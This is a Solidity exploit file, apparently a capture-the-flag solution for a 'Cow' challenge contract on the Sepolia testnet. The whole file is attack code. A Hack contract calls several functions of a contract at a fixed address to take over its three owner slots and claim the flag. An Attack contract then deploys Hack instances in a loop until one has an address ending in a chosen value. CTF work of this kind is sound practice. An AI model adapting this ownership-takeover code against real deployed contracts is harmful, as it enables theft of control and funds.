// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.17;

// sepolia faucet link: https://faucetlink.to/sepolia

interface ICow {
    function owner_1() external view returns(address);
    function owner_2() external view returns(address);
    function owner_3() external view returns(address);

    function Cow() payable external;
    function cov() payable external;
    function see() payable external;
    function buy_own() external;
    function payforflag(string memory) external;
}

contract Hack {
    ICow cow = ICow(0xCab0569b20115BB05C694e01900DFd8b9d377430);

    function getFlag() public payable {
        hackOwner1();
        hackOwner2();
        hackOwner3();
        cow.payforflag("got it!");
    }

    function hackOwner1() public payable {
        cow.Cow{value: 1 ether}();
        if (cow.owner_1() != address(this)) {
            revert("didn't hack owner1 successfully");
        }
       
    }

    // reference: https://blog.csdn.net/fly_hps/article/details/118345845
    function hackOwner2() public payable {
        cow.cov{value: 1 ether}();
        if (cow.owner_2() != address(this)) {
            revert("didn't hack owner2 successfully");
        }
    }

    function hackOwner3() public {
        cow.see();
        if (cow.owner_3() != address(this)) {
            revert("didn't hack owner3 successfully");
        }
    }
}

contract Attack {
    constructor() payable {
        // gas considered
        while(true) {
            Hack hack = new Hack();
            if (uint160(bytes20(address(hack))) & 0xffff == 0x525b) {
                hack.getFlag{value: msg.value}();
                break;
            }
        }
    }
}
